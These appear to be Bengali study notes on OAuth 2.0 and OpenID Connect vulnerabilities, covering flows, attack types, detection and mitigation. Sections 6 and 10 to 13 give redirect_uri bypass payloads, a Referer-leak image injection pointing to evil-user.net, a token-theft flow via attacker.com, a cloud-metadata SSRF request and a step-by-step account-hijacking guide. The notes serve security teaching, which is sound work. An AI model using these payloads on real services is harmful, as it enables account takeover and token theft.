# OAuth 2.0 Authentication Vulnerabilities

## 1. What is OAuth 2.0?

**Short Definition:**
OAuth 2.0 হলো একটি বহুল ব্যবহৃত authorization framework, যা কোনো অ্যাপ্লিকেশনকে ইউজারের পাসওয়ার্ড ছাড়াই অন্য একটি সার্ভারে থাকা ইউজারের অ্যাকাউন্টের নির্দিষ্ট ডেটা অ্যাক্সেস করার অনুমতি দেয়।

**Detailed Explanation:**
যখন কোনো ওয়েবসাইটে "Log in with Facebook/Google" অপশন থাকে, তখন সেটি মূলত OAuth 2.0 ব্যবহার করে তৈরি হয়। এখানে ইউজার তার মূল অ্যাকাউন্টের (যেমন Google) পুরো কন্ট্রোল না দিয়ে, থার্ড-পার্টি ওয়েবসাইটকে শুধুমাত্র নির্দিষ্ট কিছু ডেটা (যেমন ইমেইল, নাম) পড়ার অনুমতি দেয়। যদিও OAuth মূলত ডেটা শেয়ার বা authorization-এর জন্য তৈরি হয়েছিল, বর্তমানে এটি authentication মেকানিজম বা Single Sign-On (SSO)-এর বিকল্প হিসেবে ব্যাপকভাবে ব্যবহৃত হয়।

## 2. Why Does It Happen?

OAuth 2.0-এ ভালনারেবিলিটি তৈরি হওয়ার মূল কারণগুলো হলো:

* **Vague and Flexible Specification:** OAuth-এর স্পেসিফিকেশন ডিজাইনের দিক থেকেই বেশ ফ্লেক্সিবল এবং কিছুটা অস্পষ্ট। এর অনেক কম্পোনেন্ট এবং কনফিগারেশন ঐচ্ছিক (optional), যার কারণে ডেভেলপাররা প্রায়ই এটি সঠিকভাবে ইমপ্লিমেন্ট করতে ভুল করেন।
* **Lack of Built-in Security Features:** OAuth-এ খুব বেশি বিল্ট-ইন সিকিউরিটি ফিচার নেই। এর সম্পূর্ণ সিকিউরিটি নির্ভর করে ডেভেলপাররা কীভাবে সঠিক কনফিগারেশন এবং অ্যাডিশনাল ভ্যালিডেশন (যেমন ইনপুট ভ্যালিডেশন) ব্যবহার করছেন তার ওপর।
* **Data via Browser:** নির্দিষ্ট কিছু grant type-এর (যেমন Implicit flow) ক্ষেত্রে অত্যন্ত সেনসিটিভ ডেটা (access token) ইউজারের ব্রাউজারের মাধ্যমে পাঠানো হয়, যা ইন্টারসেপ্ট হওয়ার ঝুঁকি তৈরি করে।

## 3. How It Works

OAuth 2.0 প্রক্রিয়ায় সাধারণত তিনটি পক্ষ থাকে:

1. **Client application:** যে ওয়েবসাইটটি ইউজারের ডেটা অ্যাক্সেস করতে চায়।
2. **Resource owner:** ইউজার, যার ডেটা অ্যাক্সেস করা হবে।
3. **OAuth service provider:** যে ওয়েবসাইট ইউজারের ডেটা এবং অ্যাক্সেস কন্ট্রোল করে (যেমন Google, Facebook)।

**Authorization Code Grant Type (Most Secure Flow):**

1. Client application ইউজারের ব্রাউজারকে OAuth service-এর `/authorization` এন্ডপয়েন্টে রিডাইরেক্ট করে ডেটার অ্যাক্সেস চায়।
2. ইউজার লগইন করে এবং ডেটা অ্যাক্সেসের অনুমতি (consent) দেয়।
3. OAuth service ইউজারের ব্রাউজারকে Client application-এর একটি নির্দিষ্ট এন্ডপয়েন্টে (`redirect_uri`) রিডাইরেক্ট করে এবং একটি `code` (Authorization code) পাঠিয়ে দেয়।
4. Client application সেই `code` এবং নিজের `client_secret` দিয়ে OAuth service-এর `/token` এন্ডপয়েন্টে সার্ভার-টু-সার্ভার রিকোয়েস্ট পাঠায়।
5. OAuth service ভেরিফাই করে একটি Access Token দেয়।
6. Client application সেই Access Token ব্যবহার করে ইউজারের ডেটা (Resource) নিয়ে আসে।

**Implicit Grant Type (Less Secure):**
এখানে কোনো `code` এক্সচেঞ্জ হয় না। ইউজার পারমিশন দেওয়ার পর OAuth service সরাসরি URL fragment-এর (যেমন `#access_token=...`) মাধ্যমে ব্রাউজারেই Access token পাঠিয়ে দেয়।

## 4. Simple Example

**Flawed CSRF Protection (Missing state parameter):**

*Normal workflow:*
Client application ইউজারের সেশনের সাথে লিংক করা একটি ইউনিক `state` প্যারামিটার পাঠায়, যা OAuth service আবার ফেরত দেয়, যাতে নিশ্চিত হওয়া যায় যে রিকোয়েস্টটি একই ইউজারের কাছ থেকে এসেছে।

*Vulnerable scenario:*
Client application কোনো `state` প্যারামিটার ব্যবহার করে না।
অ্যাটাকার নিজের সোশ্যাল মিডিয়া অ্যাকাউন্ট ব্যবহার করে OAuth ফ্লো শুরু করে এবং `code` জেনারেট করে। কিন্তু সেই কোডটি নিজের অ্যাকাউন্টে ব্যবহার না করে, ভিকটিমকে একটি লিংকের মাধ্যমে ওই `code` সম্বলিত URL-এ ক্লিক করায়। ভিকটিম ক্লিক করলে, ভিকটিমের Client application অ্যাকাউন্টের সাথে অ্যাটাকারের সোশ্যাল মিডিয়া অ্যাকাউন্ট লিংক হয়ে যায়। এরপর অ্যাটাকার সহজেই "Log in with Social Media" ব্যবহার করে ভিকটিমের অ্যাকাউন্টে ঢুকে পড়তে পারে।

## 5. Technical Example

**Improper implementation of the Implicit grant type:**

Client application ব্রাউজার থেকে URL fragment (`#access_token=...`) থেকে টোকেনটি নিয়ে তার সার্ভারে পাঠায়:

```http
POST /authenticate HTTP/1.1
Host: client-app.com
Content-Type: application/x-www-form-urlencoded

email=carlos@carlos-montoya.net&access_token=z0y9x8w7v6u5

```

**Explanation:**
সার্ভার এখানে `access_token` এবং `email` যাচাই না করেই ইউজারকে `carlos` হিসেবে লগইন করিয়ে নেয়। অ্যাটাকার যদি শুধু `email=administrator@carlos-montoya.net` লিখে রিকোয়েস্টটি মডিফাই করে পাঠায়, সার্ভার অন্ধভাবে বিশ্বাস করে তাকে অ্যাডমিন হিসেবে লগইন করিয়ে দেবে, কারণ সার্ভারের কাছে পাসওয়ার্ড বা কোনো সিক্রেট ভেরিফাই করার মেকানিজম নেই।

## 6. Attack Flow

**Stealing an Access Token via Open Redirect (Implicit Flow):**
Attacker
↓
Identifies that the OAuth service poorly validates the `redirect_uri` parameter
↓
Crafts an authorization URL setting `redirect_uri` to a known Open Redirect vulnerability on the client app's domain (e.g., `[https://client-app.com/redirect?url=https://attacker.com](https://client-app.com/redirect?url=https://attacker.com)`)
↓
Tricks the victim into clicking the link
↓
Victim authenticates with OAuth provider and grants consent
↓
OAuth provider redirects victim to `[https://client-app.com/redirect?url=https://attacker.com#access_token=](https://client-app.com/redirect?url=https://attacker.com#access_token=)...`
↓
The Open Redirect forwards the victim to `[https://attacker.com](https://attacker.com)` along with the URL fragment containing the token
↓
Attacker extracts the access token and impersonates the victim

## 7. Important Conditions / Requirements

* Client application অথবা OAuth service provider-এর ইমপ্লিমেন্টেশনে ত্রুটি থাকতে হবে।
* `redirect_uri` ম্যানিপুলেট করা বা বাইপাস করার সুযোগ থাকতে হবে।
* `state` প্যারামিটার মিসিং থাকতে হবে বা ঠিকমতো ভ্যালিডেট না হতে হবে।
* অ্যাটাক সফল করার জন্য সাধারণত ভিকটিমকে একটি ম্যালিসিয়াস লিংকে ক্লিক করাতে হয় (সোশ্যাল ইঞ্জিনিয়ারিং)।

## 8. Types / Variations

### A. Improper Implementation of the Implicit Grant Type

**What is it?** Client application ব্রাউজার থেকে আসা টোকেন এবং ইউজার ডেটা অন্ধভাবে বিশ্বাস করে।
**How it works:** সার্ভার-সাইডে কোনো ভেরিফিকেশন ছাড়াই ইউজার-প্রদত্ত ইমেইল বা আইডি দেখে লগইন করিয়ে দেয়।

### B. Flawed CSRF Protection (Missing state)

**What is it?** OAuth ফ্লো-তে `state` প্যারামিটার ব্যবহার না করা।
**How it works:** অ্যাটাকার নিজের জেনারেট করা OAuth কোড ভিকটিমের ব্রাউজারে এক্সিকিউট করিয়ে ভিকটিমের অ্যাকাউন্টের সাথে নিজের সোশ্যাল অ্যাকাউন্ট লিংক করে দেয় (Forced profile linking)।

### C. Leaking Authorization Codes and Access Tokens

**What is it?** `redirect_uri` ম্যানিপুলেট করে কোড বা টোকেন অ্যাটাকারের সার্ভারে নিয়ে আসা।
**How it works:** `redirect_uri` ঠিকমতো ভ্যালিডেট না হলে, অ্যাটাকার তার নিজের ডোমেইন বসিয়ে ভিকটিমের কোড চুরি করে নেয়।

### D. Stealing Codes/Tokens via a Proxy Page

**What is it?** যদি `redirect_uri` কঠোরভাবে শুধু Client application-এর ডোমেইন অ্যালাউ করে, তখন ওই ডোমেইনের ভেতরেই অন্য কোনো ভালনারেবিলিটি (Open redirect, XSS, HTML injection) খুঁজে বের করা হয়।
**How it works:** `redirect_uri` হিসেবে ওই ভালনারেবল পেজের পাথ দেওয়া হয়। টোকেন ওই পেজে আসার পর, XSS বা HTML Injection-এর (যেমন `<img src="evil.com">` দিয়ে Referer হেডারে টোকেন লিক করানো) মাধ্যমে তা অ্যাটাকারের কাছে পাচার করা হয়।

### E. Flawed Scope Validation

**What is it?** ইউজারের কাছ থেকে কম পারমিশন (scope) নিয়ে পরে টোকেন এক্সচেঞ্জ বা ইউজারইনফো রিকোয়েস্টে অতিরিক্ত স্কোপ যোগ করে দেওয়া (Scope upgrade)।
**How it works:** অ্যাটাকার তার নিজস্ব ক্লায়েন্ট অ্যাপ দিয়ে ভিকটিমের কাছ থেকে শুধু `email` স্কোপের অনুমতি নেয়, কিন্তু পরে টোকেন এক্সচেঞ্জের সময় `profile` স্কোপ যুক্ত করে দেয়। সার্ভার ভ্যালিডেট না করলে সে অতিরিক্ত ডেটার অ্যাক্সেস পেয়ে যায়।

### F. Unverified User Registration

**What is it?** OAuth প্রোভাইডার যদি ইমেইল ভেরিফাই না করেই অ্যাকাউন্ট খুলতে দেয়।
**How it works:** অ্যাটাকার ভিকটিমের ইমেইল দিয়ে OAuth প্রোভাইডারে অ্যাকাউন্ট খোলে। এরপর Client application-এ "Log in with..." ব্যবহার করলে, Client app ইমেইল দেখে অ্যাটাকারকে ভিকটিমের অ্যাকাউন্টে ঢুকিয়ে দেয়।

### G. OpenID Connect Vulnerabilities

**What is it?** OpenID Connect (OIDC) হলো OAuth-এর ওপর ভিত্তি করে তৈরি একটি আইডেন্টিটি লেয়ার। এখানে `id_token` (যা একটি JWT) ব্যবহৃত হয়।
**Variations:**

* **Unprotected dynamic client registration:** `/registration` এন্ডপয়েন্টে কোনো অথেনটিকেশন ছাড়াই অ্যাটাকার নিজের ম্যালিসিয়াস ক্লায়েন্ট অ্যাপ রেজিস্টার করতে পারে। রেজিস্ট্রেশনের সময় `logo_uri` বা `jwks_uri`-এর মতো প্যারামিটারে ম্যালিসিয়াস URL দিয়ে সার্ভারকে রিকোয়েস্ট করতে বাধ্য করে (SSRF)।
* **Authorization requests by reference:** URL প্যারামিটারের বদলে `request_uri` দিয়ে একটি JWT পয়েন্ট করে দেওয়া, যা সার্ভার ফেচ করে। এটি SSRF বা ভ্যালিডেশন বাইপাসের সুযোগ তৈরি করে।

## 9. Different Contexts

* **URL Query Parameters:** Authorization code grant-এ `code` এবং `state` কোয়েরি প্যারামিটার হিসেবে যায়।
* **URL Fragments:** Implicit grant-এ `access_token` URL ফ্র্যাগমেন্ট (hash `#`) হিসেবে যায়।
* **Server-to-Server:** `/token` এবং `/userinfo` রিকোয়েস্টগুলো সাধারণত ব্যাক-এন্ড থেকে যায়।
* **JWTs:** OpenID Connect-এ `id_token` একটি JSON Web Token হিসেবে আসে।

## 10. Exploitation / Practical Understanding

`redirect_uri` ভ্যালিডেশন বাইপাস করা সবচেয়ে গুরুত্বপূর্ণ কাজ। সার্ভার কীভাবে URL পার্স করছে তার ওপর ভিত্তি করে বিভিন্ন ট্রিক ব্যবহার করা যায়:

* Subdirectory variation: `[https://client-app.com/callback/../attacker-path](https://client-app.com/callback/../attacker-path)`
* Adding URL parts: `[https://client-app.com/callback?foo=bar](https://client-app.com/callback?foo=bar)`
* Parsing quirks: `[https://client-app.com](https://client-app.com) &@foo.evil-user.net#@bar.evil-user.net/`
* Parameter pollution: `redirect_uri=client-app.com&redirect_uri=evil-user.net`
* Localhost exception: `localhost.evil-user.net`

## 11. Step-by-Step Exploitation (Account Hijacking via redirect_uri)

Step 1 — Identify the OAuth flow: "Log in with..." এ ক্লিক করুন এবং Burp Proxy-তে `/authorization` রিকোয়েস্টটি দেখুন।
Step 2 — Test `redirect_uri` validation: `redirect_uri` প্যারামিটারটি পরিবর্তন করে আপনার নিজস্ব ডোমেইন দিন।
Step 3 — Observe response: যদি সার্ভার কোনো এরর না দিয়ে আপনার ডোমেইনে রিডাইরেক্ট করে, তবে এটি ভালনারেবল।
Step 4 — Create exploit: একটি ম্যালিসিয়াস ওয়েবপেজ তৈরি করুন যা ভিকটিমকে ওই মডিফাইড Authorization URL-এ রিডাইরেক্ট করবে।
Step 5 — Steal the code: ভিকটিম লিংকে ক্লিক করলে তার `code` আপনার সার্ভারের লগে চলে আসবে।
Step 6 — Exchange code: ওই `code` টি নিয়ে Client application-এর আসল `redirect_uri` এন্ডপয়েন্টে রিকোয়েস্ট পাঠান। আপনি ভিকটিম হিসেবে লগইন হয়ে যাবেন।

## 12. HTTP Requests / Responses

**OpenID Connect Registration Request (SSRF Context):**

```http
POST /openid/register HTTP/1.1
Content-Type: application/json
Host: oauth-authorization-server.com

{
    "application_type": "web",
    "redirect_uris": ["https://client-app.com/callback"],
    "client_name": "My Application",
    "logo_uri": "http://169.254.169.254/latest/meta-data/"
}

```

*Explanation:* এখানে ডাইনামিক ক্লায়েন্ট রেজিস্ট্রেশন এন্ডপয়েন্ট ব্যবহার করা হয়েছে। `logo_uri` প্যারামিটারে ক্লাউড মেটাডেটা সার্ভারের URL দেওয়া হয়েছে। ওপেনআইডি প্রোভাইডার যদি এই URL ফেচ করে, তবে এটি একটি SSRF (Server-Side Request Forgery) ভালনারেবিলিটি ট্রিগার করবে।

## 13. Payloads

* **Implicit Flow Authentication Bypass:** `email=victim@example.com` (POST রিকোয়েস্টের বডিতে নিজের টোকেন রেখে ইমেইল পরিবর্তন করে দেওয়া)।
* **Redirect URI Parsing Bypass:** `[https://default-host.com](https://default-host.com)%20&@foo.evil-user.net#@bar.evil-user.net/`
* *Purpose:* সার্ভারের URL পার্সিং কনফিউজ করে অ্যাটাকারের ডোমেইনে রিডাইরেক্ট করানো।


* **HTML Injection for Token Leakage:** `redirect_uri=[https://client-app.com/profile?name=](https://client-app.com/profile?name=)<img src="[https://evil-user.net](https://evil-user.net)">`
* *Purpose:* ব্রাউজার যখন ইমেজ ফেচ করতে অ্যাটাকারের ডোমেইনে রিকোয়েস্ট পাঠাবে, তখন `Referer` হেডারে URL-এর কোয়েরি স্ট্রিং বা ফ্র্যাগমেন্ট লিক হয়ে যাবে (যাতে টোকেন থাকে)।



## 14. Burp Suite Workflow

* **Proxy History:** OAuth লগইন ফ্লো-র প্রতিটি ধাপ (বিশেষ করে `/authorization` এবং `/token` এন্ডপয়েন্ট) অ্যানালাইজ করার জন্য।
* **Repeater:** `/authorization` রিকোয়েস্টে `redirect_uri` বা `response_type` পরিবর্তন করে সার্ভারের ভ্যালিডেশন চেক করার জন্য।
* **Collaborator:** SSRF টেস্ট করার জন্য (যেমন `logo_uri` বা `request_uri`-তে Collaborator URL বসিয়ে)।

## 15. How to Identify / Detect

* লগইন পেজে থার্ড-পার্টি লগইন অপশন থাকলে Proxy History চেক করুন।
* রিকোয়েস্টে `client_id`, `redirect_uri`, `response_type` প্যারামিটার খুঁজুন।
* `/.well-known/oauth-authorization-server` বা `/.well-known/openid-configuration` এন্ডপয়েন্টে GET রিকোয়েস্ট পাঠিয়ে সার্ভারের কনফিগারেশন এবং সাপোর্টেড ফিচার সম্পর্কে জানুন।
* `response_type=id_token` বা `scope=openid` থাকলে নিশ্চিত হবেন এটি OpenID Connect ব্যবহার করছে।

## 16. Common Mistakes

* `state` প্যারামিটার ব্যবহার না করা বা ভ্যালিডেট না করা।
* Implicit flow-তে ক্লায়েন্ট ব্রাউজার থেকে আসা ডেটা (যেমন ইমেইল) সার্ভার-সাইডে যাচাই না করেই বিশ্বাস করা।
* `redirect_uri` ভ্যালিডেশনের ক্ষেত্রে exact match-এর বদলে pattern matching বা 'starts with' লজিক ব্যবহার করা।

## 17. Limitations

* যদি OAuth প্রোভাইডার `redirect_uri` হুবহু বাইট-টু-বাইট (byte-for-byte) ম্যাচ করে ভ্যালিডেট করে, তবে এটি বাইপাস করা অত্যন্ত কঠিন।
* Authorization code flow-তে `client_secret` অ্যাটাকারের কাছে থাকে না। তাই কোড চুরি করলেও, প্রোভাইডার যদি `/token` এন্ডপয়েন্টে দ্বিতীয়বার `redirect_uri` চেক করে, তবে অ্যাটাক ফেইল করবে।
* `state` প্যারামিটার স্ট্রংভাবে সেশনের সাথে বাইন্ড করা থাকলে CSRF অ্যাটাক করা যায় না।

## 18. Edge Cases / Important Details

* **Referer Header Leakage:** অনেক সময় সফলভাবে রিডাইরেক্ট হওয়ার পর পেজে এক্সটারনাল ইমেজ বা স্ক্রিপ্ট থাকলে `Referer` হেডারের মাধ্যমে Authorization code লিক হয়ে যেতে পারে।
* **response_mode manipulation:** `redirect_uri` বাইপাস করার সময় `response_mode=fragment` বা `web_message` ব্যবহার করলে সার্ভারের পার্সিং লজিক পরিবর্তন হয়ে যেতে পারে, যা বাইপাসে সাহায্য করে।

## 19. Database / Platform / Technology Differences

* **OAuth 2.0 vs OAuth 1.0a:** OAuth 1.0a সম্পূর্ণ ভিন্ন এবং পুরনো। পোর্টসুইগারের এই কন্টেন্ট শুধুমাত্র OAuth 2.0 এর জন্য প্রযোজ্য।
* **OAuth vs OpenID Connect:** OAuth হলো authorization-এর জন্য। OIDC হলো আইডেন্টিটি এবং authentication-এর জন্য, যা OAuth-এর ওপর তৈরি এবং এটি `id_token` (JWT) ব্যবহার করে।
* **Mobile / Native Apps:** এই ধরনের অ্যাপে `client_secret` নিরাপদে রাখা যায় না। তাই এদের ক্ষেত্রে PKCE (RFC 7636) মেকানিজম ব্যবহার করা হয়।

## 20. Impact

* **Authentication Bypass:** অন্য ইউজারের অ্যাকাউন্টে লগইন করা।
* **Account Hijacking:** ভিকটিমের অ্যাকাউন্টের সম্পূর্ণ নিয়ন্ত্রণ নেওয়া।
* **Data Theft:** ভিকটিমের সেনসিটিভ ডেটা (যেমন কন্টাক্ট লিস্ট, প্রোফাইল ইনফরমেশন) চুরি করা।

## 21. Prevention / Mitigation

**For OAuth Service Providers:**

* `redirect_uri` এর জন্য exact byte-for-byte ম্যাচিং ব্যবহার করে strict whitelist এনফোর্স করুন।
* `state` প্যারামিটার ব্যবহার বাধ্যতামূলক করুন এবং এটি ইউজারের সেশনের সাথে লিংকড রাখুন।
* রিসোর্স সার্ভারে চেক করুন যে টোকেনটি যে `client_id` এর জন্য ইস্যু করা হয়েছিল, সে-ই রিকোয়েস্ট করছে কি না।

**For OAuth Client Applications:**

* Implicit flow-র বদলে Authorization code flow ব্যবহার করুন।
* ব্রাউজার থেকে আসা কোনো ডেটা (Implicit flow-তে) ব্লাইন্ডলি ট্রাস্ট করবেন না।
* অফিশিয়ালি বাধ্যতামূলক না হলেও সব সময় `state` প্যারামিটার ব্যবহার করুন।
* OpenID Connect ব্যবহার করলে `id_token` (JWT) এর সিগনেচার এবং ভ্যালিডিটি কঠোরভাবে চেক করুন।
* মোবাইল অ্যাপের ক্ষেত্রে PKCE ব্যবহার করুন।

## 22. Vulnerable vs Secure Example

**Vulnerable Validation (Client App):**

```http
POST /login HTTP/1.1
Host: client.com

email=admin@example.com&token=attacker_token

```

*Why vulnerable?* ক্লায়েন্ট অ্যাপ ইমেইল অ্যাড্রেসটি ব্রাউজার থেকে গ্রহণ করে এবং ভেরিফাই না করেই ট্রাস্ট করে।

**Secure Validation:**

```http
POST /login HTTP/1.1
Host: client.com

token=attacker_token

```

*Why secure?* ক্লায়েন্ট অ্যাপ ব্রাউজার থেকে কোনো আইডেন্টিটি ডেটা নেয় না। সে নিজে সার্ভার-টু-সার্ভার রিকোয়েস্ট করে টোকেন দিয়ে OAuth প্রোভাইডারের কাছ থেকে ইউজারের ইমেইল জেনে নেয়।

## 23. Real Understanding

OAuth 2.0 মূলত ডেটা ডেলিগেশনের (delegation) জন্য তৈরি, কিন্তু ডেভেলপাররা একে প্রমাণীকরণ (authentication) বা লগইনের জন্য ব্যবহার করতে শুরু করে। সমস্যাটা এখানেই—যে মেকানিজম শুধু পারমিশন শেয়ার করার জন্য, তা দিয়ে আইডেন্টিটি প্রুফ করতে গেলে অনেক গর্ত (loopholes) থেকে যায়। OpenID Connect এই গর্তগুলো বন্ধ করার চেষ্টা করেছে, কিন্তু ইমপ্লিমেন্টেশন এবং কনফিগারেশনে ভুল থাকলে অ্যাটাকাররা ব্রাউজারের রিডাইরেক্ট ফ্লো-কে ম্যানিপুলেট করে টোকেন বা কোড চুরি করে নেয়, অথবা সার্ভারের অন্ধ বিশ্বাসের সুযোগ নিয়ে নিজেদের অন্য কেউ হিসেবে দাবি করে।

## 24. Mental Model

Client App requests Data -> Redirects User to Provider
↓
Provider asks User for consent
↓
User consents -> Provider sends Code/Token back to Client App (via User's Browser)
↓
Attacker intercepts or manipulates this flow:

* Steals Token by manipulating `redirect_uri`
* Fakes identity by altering Client App's POST request
* Forces User to link Attacker's account (Missing `state`)
↓
Attacker bypasses authentication or accesses User Data

## 25. Quick Revision

* **Definition:** সোশ্যাল লগইন মেকানিজমে (OAuth 2.0) ত্রুটির কারণে অথেনটিকেশন বাইপাস বা ডেটা লিক।
* **Cause:** অস্পষ্ট স্পেসিফিকেশন, ভুল কনফিগারেশন এবং ব্রাউজারের মাধ্যমে সেনসিটিভ ডেটা ট্রান্সফার।
* **Main idea:** OAuth ফ্লো ম্যানিপুলেট করে কোড/টোকেন চুরি করা বা আইডেন্টিটি ফেইক করা।
* **Attack flow:** Manipulate `redirect_uri` -> Steal Code/Token -> Impersonate User.
* **Important condition:** `redirect_uri` ভ্যালিডেশন ফ্ল বা `state` প্যারামিটারের অভাব।
* **Main techniques:** Improper implicit grant, CSRF (forced linking), `redirect_uri` bypass, OpenID SSRF.
* **Detection:** `client_id`, `response_type`, `redirect_uri` প্যারামিটার এবং `/.well-known/...` এন্ডপয়েন্ট চেক করা।
* **Impact:** Account takeover, full authentication bypass.
* **Prevention:** Strict URL whitelist (byte-for-byte), enforce `state` parameter, use Auth Code flow instead of Implicit.

## 26. Things to Remember

* OAuth 2.0-এ `state` প্যারামিটার অপশনাল হলেও, সিকিউরিটির জন্য এটি অত্যাবশ্যক (CSRF ঠেকায়)।
* Implicit flow সবচেয়ে অনিরাপদ কারণ এতে টোকেন সরাসরি ব্রাউজারে URL fragment হিসেবে আসে।
* OpenID Connect-এ `id_token` ব্যবহৃত হয় যা মূলত একটি JWT, তাই এতে JWT অ্যাটাকগুলোও (যেমন signature bypass) অ্যাপ্লাই করা যেতে পারে।
* `redirect_uri` বাইপাস করতে না পারলে টার্গেট ডোমেইনের ভেতরে Open Redirect বা XSS খুঁজে বের করে টোকেন চুরি করা যায়।

